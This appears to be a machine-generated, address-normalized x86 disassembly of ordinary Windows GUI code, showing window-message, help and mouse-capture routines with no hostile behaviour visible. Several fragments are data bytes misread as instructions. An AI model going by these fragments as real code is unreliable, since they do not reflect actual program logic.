je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_44dd40
sub_44196c
call sub_44dd40
retn
sub_4419e9
jmp sub_4039a8
sub_4419f0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_441a28
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x18b
mov eax [ ebx + 0x10 ]
call sub_4507d8
push eax
call SendMessageA
pop ebx
retn
sub_441b08
jmp sub_4039a8
sub_441b0f
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_441b9b
jmp sub_4039a8
sub_441ba2
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_441ce1
jmp sub_4039a8
sub_441ce8
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_441d7d
jmp sub_4039a8
sub_441d84
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_441d8c
push esi
mov eax [ eax + 0x10 ]
mov si 0xffae
call sub_403450
pop esi
retn
sub_441eca
jmp sub_4039a8
sub_441eec
jmp sub_4039a8
sub_441ef3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_441efc
push esi
mov eax [ eax + 0x10 ]
mov si 0xffaf
call sub_403450
pop esi
retn
sub_442066
jmp sub_4039a8
sub_442083
jmp sub_4039a8
sub_44208a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44222d
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc8
retn
sub_44223b
jmp sub_4039a8
j_sub_44222d
jmp sub_44222d
sub_442242
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_442290
push esi
mov si 0xffb1
call sub_403450
pop esi
retn
sub_44229c
push esi
mov si 0xffb0
call sub_403450
pop esi
retn
sub_4422f0
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_44245b
jmp sub_4039a8
sub_442462
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4425ac
mov dl [ eax + 0x238 ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ eax + 0x214 ]
retn
sub_4425d0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x190
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
pop ebx
retn
sub_442638
cmp dl [ eax + 0x23b ]
je r-xdata
retn
mov [ eax + 0x23b ] dl
call sub_44dd40
sub_4426b8
cmp edx [ eax + 0x230 ]
je r-xdata
retn
test edx edx
jle r-xdata
mov [ eax + 0x230 ] edx
call sub_44dd40
sub_4426d0
test edx edx
jge r-xdata
cmp edx [ eax + 0x23c ]
je r-xdata
xor edx edx
retn
mov [ eax + 0x23c ] edx
call sub_44dd40
sub_4426ec
cmp dl [ eax + 0x208 ]
je r-xdata
retn
mov [ eax + 0x208 ] dl
call sub_44dd40
sub_442800
mov cl [ eax + 0x238 ]
add cl 0xfd
sub cl 0x2
jb r-xdata
retn
cmp dl [ eax + 0x23a ]
je r-xdata
mov [ eax + 0x23a ] dl
call sub_44dd40
sub_442860
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x18e
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
pop ebx
retn
sub_442924
jmp sub_4039a8
sub_44292b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4429c6
jmp sub_4039a8
sub_4429cd
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4429d4
cmp dl [ eax + 0x224 ]
je r-xdata
retn
mov [ eax + 0x224 ] dl
call sub_44dd40
sub_443010
push ebx
mov ebx eax
mov eax ebx
call sub_44ed8c
mov eax ebx
call sub_4424d8
pop ebx
retn
sub_443190
jmp sub_4039a8
sub_443197
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4431a0
push ebx
cmp [ eax + 0x25a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x25c ]
call [ ebx + 0x258 ]
sub_4435b4
jmp sub_4039a8
sub_4435bb
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_443698
jmp sub_4039a8
sub_44369f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4436a8
push ebx
cmp [ eax + 0x262 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
sub_443714
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x193
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
pop ebx
retn
sub_443781
jmp sub_4039a8
sub_443788
pop ebp
retn
sub_44378c
sub [ rw-data ] 0x1
retn
sub_4438e9
jmp sub_4039a8
sub_4438f0
pop ebp
retn
sub_4438f4
sub [ rw-data ] 0x1
retn
sub_44390d
add eax 0xffffffe0
jmp sub_443ef4
sub_443915
add eax 0xffffffe0
jmp sub_443f5c
sub_44391d
add eax 0xffffffe0
jmp sub_444070
sub_443925
add eax 0xffffffe0
jmp sub_4440e4
sub_44392d
add eax 0xffffffe0
jmp sub_443ba0
sub_443935
add eax 0xffffffe0
jmp sub_443bb4
sub_44393d
add eax 0xffffffe0
jmp sub_443c2c
sub_443945
add eax 0xffffffe0
jmp sub_443cd0
sub_44394d
add eax 0xffffffe0
jmp sub_443cd4
sub_443955
add eax 0xffffffe0
jmp sub_443d5c
sub_44395d
add eax 0xffffffe0
jmp sub_443ea4
sub_443965
add eax 0xffffffe0
jmp sub_443ea8
sub_44396d
add eax 0xffffffe0
jmp sub_443ec4
sub_443975
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405ab4
sub_44397f
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405adc
sub_443989
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405af0
sub_443b5d
jmp sub_4039a8
sub_443b64
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_443ba0
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_403ff8
pop ebx
retn
sub_443c1b
jmp sub_4039a8
sub_443c22
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_443cb4
jmp sub_4039a8
sub_443cbb
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_443cd0
mov al 0x1
retn
sub_443d4f
jmp sub_4039a8
sub_443d56
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_443e54
jmp sub_4039a8
sub_443e5b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_443ea4
mov [ eax + 0xc ] edx
retn
sub_443ea8
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_443f4c
jmp sub_4039a8
sub_443f53
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_444052
jmp sub_4039a8
sub_444059
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4440d2
jmp sub_4039a8
sub_4440d9
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_444164
jmp sub_4039a8
sub_44416b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44425f
jmp sub_4039a8
sub_444266
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_444328
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_444274
call EnumWindows
retn
sub_4443ba
jmp sub_4039a8
sub_4443c1
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4443cc
xor eax eax
retn
sub_4444c5
jmp sub_4039a8
sub_4444cc
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4445b6
jmp sub_4039a8
sub_4445bd
pop ebp
retn
sub_444612
jmp sub_4039a8
sub_444619
pop ebp
retn
sub_44579c
jmp r-xdata
sub_44579e
0xe8ffe9ff 0xe7ff
sub_4457a5
jmp esi
sub_445f4c
inc esp
add [ eax - 0x2bffbb16 ] dh
0xeb240044 0x44
sub_44685d
add eax 0xffffff8c
jmp sub_452e64
sub_446865
add eax 0xffffff8c
jmp sub_452e68
sub_44686d
add eax 0xffffff8c
jmp sub_452f54
sub_446875
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
xchg [ esp ] eax
retn
sub_446882
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0xc ]
xchg [ esp ] eax
retn
sub_44688f
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x28 ]
xchg [ esp ] eax
retn
sub_44689c
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x14 ]
xchg [ esp ] eax
retn
sub_4468a9
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
xchg [ esp ] eax
retn
sub_4468b6
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x20 ]
xchg [ esp ] eax
retn
sub_4468c3
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x1c ]
xchg [ esp ] eax
retn
sub_4468d0
add eax 0xffffff8c
jmp sub_4545c4
sub_4468d8
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405ab4
sub_4468e2
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405adc
sub_4468ec
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405af0
sub_446d44
mov dl [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_447057
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_41a080
retn
sub_447074
push 0x15
mov ecx rw-data
call sub_41a040
retn
sub_447160
call GetCapture
call sub_446e44
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_4473c4
push ebx
push eax
push sub_447548
call sub_421110
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_4473dc
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_44740c
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_4211c4
pop ebx
retn
sub_4474ea
jmp sub_4036f4
sub_44751c
xor eax eax
retn
sub_447520
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_447538
retn
sub_44753c
mov eax [ rw-data ]
retn
sub_447544
retn
sub_447572
jmp sub_4036f4
sub_447577
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46ad0c
call sub_403a5c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_447594
call sub_4034ac
xor eax eax
mov [ rw-data ] eax
retn
sub_4475a4
call sub_4034a8
xor eax eax
mov [ rw-data ] eax
retn
sub_4475b4
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403578
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_447664
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_44767c
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_4476c8
retn
sub_447880
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_403450
pop esi
retn
sub_447894
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_403450
pop esi
retn
sub_4478a8
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_4478b4
mov eax 0x4
retn
sub_4478bc
retn
sub_4484ad
jmp sub_4036f4
sub_44879a
jmp sub_4039a8
sub_44880c
jmp sub_4039a8
sub_448818
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_448540
sub_448997
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_42446c
retn
sub_4489ad
jmp sub_4039a8
sub_4489d4
jmp sub_4039a8
sub_448a56
jmp sub_4039a8
sub_448a7e
jmp sub_4039a8
sub_448a85
mov esp ebp
pop ebp
retn
sub_448b3d
jmp sub_4039a8
sub_448b94
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_448b60
mov [ ebx + 0x58 ] esi
sub_448ce8
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_448cfc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403404
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_448de5
jmp sub_4039a8
sub_448dec
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_448e6f
jmp sub_4039a8
sub_448e76
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_449244
xor eax eax
retn
sub_449248
mov al [ eax + 0x58 ]
retn
sub_44924c
xor eax eax
retn
sub_449250
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_449258
mov eax [ eax + 0x30 ]
retn
sub_4492fc
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_4493a8
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_4493c0
mov [ eax + 0x5d ] dl
retn
sub_4493c4
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_44cfa4
sub_4493d4
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_4498b7
jmp sub_4039a8
sub_4498be
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_449920
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_4499a4
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_449ac1
jmp sub_4039a8
sub_449ac8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_449bc4
push eax
xor ecx ecx
mov edx 0xb037
call sub_44b16c
retn
sub_449d85
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_403450
sub_449e36
jmp sub_4039a8
sub_449e3d
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_449f14
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_44b16c
sub_449f2c
push 0x0
xor ecx ecx
mov edx 0xe
call sub_44b16c
retn
sub_449f3c
push edx
mov edx 0xd
call sub_44b16c
retn
sub_449f48
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_449f5c
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_44a03d
jmp sub_4039a8
sub_44a044
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44a04c
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_44b16c
sub_44a0bc
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_44a0d0
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_44a0dc
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_44a0e4
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_44b16c
sub_44a108
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_44b16c
sub_44a12c
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_44b16c
sub_44a174
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_44a17c
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_44b16c
sub_44a1a0
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_44b16c
sub_44a1c4
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_44b16c
sub_44a1e0
push ebx
mov ebx eax
call sub_447160
cmp ebx eax
sete al
pop ebx
retn
sub_44a218
push esi
mov dl 0x1
mov si 0xffce
call sub_403450
pop esi
retn
sub_44a362
jmp sub_4039a8
sub_44a369
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44a48c
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_44a400
retn
sub_44a4e0
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_44a4f4
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_44a5d9
jmp sub_4039a8
sub_44a5f8
xor eax eax
retn
sub_44a5fc
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_44a614
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_44a62c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_44a648
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_44a660
retn
sub_44a724
retn
sub_44a728
cmp eax [ rw-data ]
sete al
retn
sub_44a79c
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_44a8b8
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_403450
pop esi
pop ebp
retn 0x4
sub_44a8f8
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_44ab8f
jmp sub_4039a8
sub_44ab96
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44aba0
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_403450
pop esi
retn
sub_44abb4
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_403450
pop esi
retn
sub_44ae83
jmp sub_4039a8
sub_44af2c
push esi
mov si 0xffee
call sub_403450
pop esi
retn
sub_44af38
mov al 0x1
retn
sub_44b210
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_44960c
retn
sub_44b234
retn
sub_44b44d
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41d8e0
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_44b468
mov al [ eax + 0x5e ]
xchg edx eax
call sub_41fc18
retn
sub_44b560
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_44bb78
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_44bb80
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_44bb88
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_44bc40
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44bc60
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_44a108
mov [ ebx + 0x9a ] 0x1
sub_44bcb8
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_44a0ac
mov [ ebx + 0x56 ] 0x1
sub_44bcdc
mov [ edx + 0xc ] 0x1
retn
sub_44bce4
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_44b16c
sub_44bcfc
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_44b16c
sub_44bd14
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_44bf7a
jmp sub_4039a8
sub_44bf81
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44bfac
mov eax [ r-xdata ]
retn
sub_44c148
jmp sub_4039a8
sub_44c14f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44c270
mov eax [ eax + 0xb8 ]
retn
sub_44c2d8
push ebx
mov ebx eax
mov eax ebx
call sub_44a5fc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_44c2f4
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_44c48c
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_44c4bc
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_44c4c4
call sub_449078
retn
sub_44c5c4
jmp sub_4039a8
sub_44c784
jmp sub_4039a8
sub_44c7d4
jmp sub_4039a8
sub_44c80c
retn
sub_44ca95
jmp sub_4039a8
sub_44cc1d
jmp sub_4039a8
sub_44cf7f
jmp sub_4039a8
sub_44d02b
jmp sub_4039a8
sub_44d038
inc [ eax + 0x160 ]
retn
sub_44d040
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_44d060
sub_44d060
xor edx edx
call sub_44cfa4
retn
sub_44d12d
jmp sub_4039a8
sub_44d134
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44d223
jmp sub_4039a8
sub_44d74a
jmp sub_4039a8
sub_44d751
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44d919
jmp sub_4039a8
sub_44d920
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44d9f4
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_44dbe1
jmp sub_4039a8
sub_44dbe8
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_44dcd8
xor eax eax
retn
sub_44dd40
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_44b16c
sub_44de6e
jmp sub_4036f4
sub_44dfa3
jmp sub_4039a8
sub_44dfaa
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44dfb4
jmp sub_4036f4
sub_44dfb9
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46ad0c
call sub_403a5c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44e574
jmp sub_4039a8
sub_44e57b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44e584
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_44ea82
jmp sub_4039a8
sub_44ead4
push ebx
mov ebx eax
call sub_422afc
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_44b16c
pop ebx
retn
sub_44eaf0
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_44b16c
retn
sub_44eb04
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_44b16c
retn
sub_44eb14
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_44b16c
retn
sub_44edc0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_450ae8
pop esi
retn
sub_44eed4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44ef24
pop esi
retn
sub_44eee8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44f010
pop esi
retn
sub_44eefc
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_44ef10
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_44f003
jmp sub_4039a8
sub_44f00a
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44f09a
jmp sub_4039a8
sub_44f0a1
pop ebx
pop ecx
pop ebp
retn
sub_44f0a8
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_44f0b8
retn
sub_44f0bc
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_44f0dc
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_44f23c
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_44f30c
retn
sub_44f424
jmp sub_4039a8
sub_44f42b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44f4f6
jmp sub_4039a8
sub_44f520
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_44f5b2
jmp sub_4039a8
sub_44f784
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_44fa28
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
